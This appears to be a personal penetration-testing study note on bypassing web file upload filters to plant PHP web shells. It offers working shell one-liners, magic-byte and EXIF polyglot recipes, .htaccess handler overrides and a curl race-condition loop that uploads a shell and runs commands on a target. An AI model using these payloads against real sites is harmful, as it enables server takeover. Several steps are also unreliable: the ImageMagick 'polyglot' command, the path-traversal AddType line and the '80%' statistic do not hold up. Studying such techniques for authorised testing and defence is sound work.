---
tags: [oscp, web, upload, bypass]
aliases: [File Upload Vulnerabilities]
category: Web
difficulty: ★★☆☆☆
last-updated: 2025-04-30
---

# 📤 File Upload Bypass Techniques

> [!info] Upload to RCE
> Upload restriction bypass = shell upload = RCE.

---

## 🎯 Common Bypasses

### 1. MIME Type Manipulation

```bash
# Burp Interceptor: Change Content-Type header

Original:
POST /upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

Modified:
Content-Type: image/jpeg    # Claim it's JPEG

# Server checks MIME type, not actual file
```

### 2. Double Extension

```
shell.php.jpg       # Server runs .php, ignores .jpg
shell.php.png
shell.php.gif
shell.php.txt
```

### 3. Null Byte (PHP < 5.3.4)

```
shell.php%00.jpg    → shell.php (null byte truncates)
```

### 4. Case Variation

```
shell.PhP
shell.pHp
shell.PHP
shell.pHP
```

### 5. Alternative Extensions

```php
.phtml    → PHP HTML
.phar     → PHP Archive
.phps     → PHP Source
.shtml    → Server-Side HTML
.inc      → Include (if treated as PHP)
```

---

## 🖼️ Image-Based Bypasses

### Magic Bytes (File Signature)

```bash
# Add PNG header before PHP code
hexdump:
89 50 4E 47 0D 0A 1A 0A = PNG header

printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > shell.php

# Then add PHP code
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

### Using ImageMagick

```bash
# Create polyglot: valid image + valid PHP
convert shell.php shell.jpg
# = valid JPEG + valid PHP payload

# Or manually: JPEG header + PHP code
cat header.jpg shell.php > shell.php.jpg
```

---

## 🔧 htaccess Upload

**If .htaccess upload is allowed:**

```apache
# Create .htaccess
AddType application/x-httpd-php .jpg

# Upload shell.jpg (contains PHP)
<?php system($_GET['cmd']); ?>

# Access shell.jpg → PHP executes!
```

---

## 📋 Polyglot Files

**Create file that's both valid image AND valid PHP:**

```bash
# Using exiftool
exiftool -Comment="<?php system(\$_GET['cmd']); ?>" image.jpg

# Result: JPEG with PHP payload in EXIF
```

---

## 🔄 Race Condition

**Upload → File processed before deleted:**

```bash
# Fast loop uploading shell
while true; do
  curl -F "file=@shell.php" http://target/upload.php
  # Browser requests before file deleted
  curl http://target/uploads/shell.php?cmd=id
done
```

---

## 📦 Archive Extraction

**If server extracts uploaded ZIP:**

```bash
# Create ZIP with PHP in subdirectory
zip -r upload.zip shell.php

# Upload upload.zip
# Server extracts → shell.php accessible
```

---

## 🗂️ .htaccess + Path Traversal

```apache
# .htaccess with path traversal
AddType application/x-httpd-php ../../shell.php
```

---

## 📊 Upload Bypass Checklist

- [ ] Test simple PHP upload
- [ ] Try MIME type change (Content-Type)
- [ ] Try double extension (.php.jpg)
- [ ] Try case variation (.PhP, .pHP)
- [ ] Try alternative extensions (.phtml, .phar)
- [ ] Try null byte (.php%00.jpg)
- [ ] Check if .htaccess upload allowed
- [ ] Try polyglot image (exiftool)
- [ ] Try magic byte header
- [ ] Look for race condition window

---

## 💡 Pro Tips

> [!tip] MIME Type Change is Easiest
> 80% of upload filters only check Content-Type header.

> [!tip] Test with Image Files
> Most servers allow image uploads. Polyglot images bypass filters.

> [!tip] Check Allowed Extensions
> Try uploading with each allowed extension + PHP payload

---

**Related Notes:**
- [[04-Web/Web-Vulnerabilities|🌐 Web Vulnerabilities]]
- [[04-Web/LFI-RFI-to-RCE|🔗 LFI/RFI to RCE]]

---
